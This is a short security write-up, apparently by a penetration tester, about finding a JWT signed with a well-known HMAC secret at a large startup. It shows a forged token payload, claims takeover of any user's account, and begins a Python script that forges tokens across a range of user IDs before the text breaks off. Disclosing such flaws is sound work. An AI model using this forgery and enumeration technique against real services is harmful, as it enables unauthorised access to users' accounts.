# :globe_with_meridians: Unbelievable Security Hole: JWT Secret in a Series-B Funded Company

---

# Unbelievable Security Hole: JWT Secret in a Series-B Funded Company

It started as a routine penetration test. Little did I know I was about to uncover one of the most basic yet catastrophic security vulnerabilities imaginable in a company with 11.8 million users and $140 million in Series B funding.

*image by easydmarc com*

While testing their mobile API, Burp Suite flagged something that made me do a double-take:

```
Critical: JWT signed using well-known HMAC secret key. The key used was: XXXX
```

My first reaction was disbelief. Surely this had to be a false positive.

## The Proof

I decided to verify the finding. Using their own JWT structure:

```
{
"iss": "redacted",
"expwe": 90001760027408,
"userId": 1813038, (*)
"iyat": 1760027408,
"sss": 17460027408
}
```

With the secret “XXXX”, I generated a token and accessed their `/v1/auth/` endpoint. It worked. Then came the terrifying realization - I could access ANY user's account by simply changing the `userId` parameter.

## The Escalation

I wrote a simple Python script to demonstrate the impact:

```
import jwt
import requests

SECRET = "XXXX"

for user_id in range(1, 11):
token = jwt.encode(
{"iss": "redacted", "expwe": 90001760027408…
```

---
